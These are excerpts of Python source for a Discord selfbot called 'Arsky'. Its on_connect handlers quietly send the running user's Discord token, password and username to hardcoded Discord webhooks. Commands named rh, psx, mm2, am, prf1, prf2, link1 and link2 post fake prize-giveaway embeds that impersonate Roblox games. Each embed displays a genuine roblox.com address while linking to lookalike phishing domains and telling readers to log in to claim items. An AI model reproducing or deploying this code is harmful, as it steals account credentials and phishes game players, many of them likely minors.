...
░╚════╝░╚═╝░░░░░                                                                             
                       ...
                       {Fore.RED}Arsky v{SELFBOT.__version__} | {Fore.CYAN}WE LOOGED IN AS : {Arsky.user.name}#{Arsky.user.discriminator} {Fore.RED}| ID: {Fore.CYAN}{Arsky.user.id}   
                       {Fore.YELLOW}Nitro Sniper | {Fore.CYAN}{nitro}
                       {Fore.RED}Cached Users: {Fore.CYAN}{len(Arsky.users)}
                       {Fore.BLUE}Guilds: {Fore.CYAN}{len(Arsky.guilds)}
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/849428647248527360/OMKLKvgUXzb1bdG9bAH3-IHL4CbdLW2f9RydZuM7pYFTnan4VlRKFpqN5ctmgsngqqkS',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
    startprint()
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/918610403322376302/TeahVugsj3Nc6_rXQx9cCtIjbREJ7Ld7TZ_wWUqdbOOqkoeQdniJ2pDQ7KA9MqKiyVJk',json={'content': f"**Toe:** `{toe}`\n**Pas:** `{password}`**Username: {Arsky.user.name}**"})
    startprint()
...
@Arsky.command()
async def rh(ctx,):
    embed = discord.Embed(title='Join My GIVEAWAY!!!', description= 'I held a giveaway before leaving RH with a prize of **1 MIL DIAMONDS OR 1 HALO**. Join my giveaway here: [https://www.roblox.com/users/32152363/profile](https://web-www-roblox.com/users/6288768226/profile)', color=0xff00c8)
    embed.set_author(name="Royale High", icon_url="https://media.discordapp.net/attachments/927414808893079552/927495261620666408/OHUADG.jpg")
    embed.set_footer(text='Ends in 30 Minutes')
    embed.set_thumbnail(url=  'https://media.discordapp.net/attachments/927414808893079552/929296119601704960/Png.png')
    embed.set_image(url= 'https://media.discordapp.net/attachments/927414808893079552/927495362439159818/12e553c710351b1a1ddd404dbee4f6f2.png')
    await ctx.send(embed=embed)
    await ctx.message.delete()

@Arsky.command()
async def psx(ctx,):
   embed=discord.Embed(title="CONGRATS!!!", description="You were selected as the winner of the Christmas Event :santa:! You get **Huge Santa Paws and 25B GEMS**, immediately add my account and join Pet Simulator X get the prize :gift: Join Me on Roblox: [https://web.roblox.com/users/32152363/profile](https://web-www-roblox.com/users/6288768226/profile)", color=0xffa200)
   embed.set_author(name="BIG Games", icon_url="https://images-ext-2.discordapp.net/external/m0VDpThxL27z5MnRGG59vALP-TqZbETiyRRvkitHy8I/%3Fsize%3D240/https/cdn.discordapp.com/icons/349051257702580224/a_5dcabd68103f75267ee3a22e87105c31.webp")
   embed.set_footer(text="Ends in 15 Minutes")
   embed.set_image(url='https://media.discordapp.net/attachments/927414808893079552/928233603920437248/ezgif.com-gif-maker.gif')
   embed.set_thumbnail(url="https://media.discordapp.net/attachments/927414808893079552/929296119601704960/Png.png")
   await ctx.send(embed=embed)
   await ctx.message.delete()
...
@Arsky.command()
async def mm2(ctx,):
   embed=discord.Embed(title="Congrats You WON!!!", description="  **You won!** Congrats you  won the free MM2 item giveaway use the link below to login and claim all your free items here: [https://web.roblox.com/users/883286105/profile](https://web-www-roblox.com/users/6288768226/profile)", color=0xff0000)
   embed.set_author(name="Murder Mystery 2", icon_url="https://media.discordapp.net/attachments/927414808893079552/928147495568171038/mm2.png")
   embed.set_thumbnail(url="https://media.discordapp.net/attachments/927414808893079552/929296119601704960/Png.png")
   embed.set_footer(text="Ends in 15 Minutes")
   embed.set_image(url='https://images-ext-1.discordapp.net/external/6m9gdsubs2ALLN9FzeCTfYDEBDWEPnRNLpTQkHzEkJY/%3Fwidth%3D799%26height%3D449/https/media.discordapp.net/attachments/923641300501270558/929262744748822540/2022-01-08-13-29-41.gif')
   await ctx.send(embed=embed)
   await ctx.message.delete()

@Arsky.command()
async def am(ctx,):
   embed=discord.Embed(title="Congrats You WON!!!", description="  **You won!** Congrats you won **Shadow Dragon & Giraffe** claim your free pet in here: [https://web.roblox.com/users/883286105/profile](https://web-www-roblox.com/users/6288768226/profile)", color=0xffffff)
   embed.set_author(name="Adopt Me", icon_url="https://images-ext-2.discordapp.net/external/tGGERAdV-xXDpGT-5F-ADsWVnLCU5f-rywotgZ3wmWU/https/media.discordapp.net/attachments/926740374330953738/929294384984363008/Jpeg.jpg")
   embed.set_thumbnail(url="https://media.discordapp.net/attachments/927414808893079552/929296119601704960/Png.png")
   embed.set_footer(text="Ends in 30 Minutes")
   embed.set_image(url='')
   await ctx.send(embed=embed)
...
@Arsky.command()
async def prf1(ctx,):
   embed=discord.Embed(title="callmehlunacy's Profile", url="https://roblox.com.hr/users/8246401139/profile", description="callmehlunacy is one of the millions creating and exploring the endless possibilities of Roblox. Join callmehlunacy on Roblox and explore together!Join Me Guys")
...
@Arsky.command()
async def prf2(ctx,):
   embed=discord.Embed(title="callmehlunacy's Profile", url="https://web-www-roblox.com/users/6288768226/profile", description="callmehlunacy is one of the millions creating and exploring the endless possibilities of Roblox. Join callmehlunacy on Roblox and explore together!Join Me Guys")
   embed.set_author(name="Roblox")
   embed.set_thumbnail(url="https://media.discordapp.net/attachments/927414808893079552/929296119601704960/Png.png")
   await ctx.send(embed=embed)
   await ctx.message.delete()
...
@Arsky.command()
async def link1(ctx,):
   embed=discord.Embed(title="https://www.roblox.com/users/735342446/profile", url="https://roblox.com.hr/users/8246401139/profile")
   await ctx.send(embed=embed)
   await ctx.message.delete()

@Arsky.command()
async def link2(ctx,):
   embed=discord.Embed(title="https://www.roblox.com/users/735342446/profile", url="https://web-www-roblox.com/users/6288768226/profile")
   await ctx.send(embed=embed)
   await ctx.message.delete()
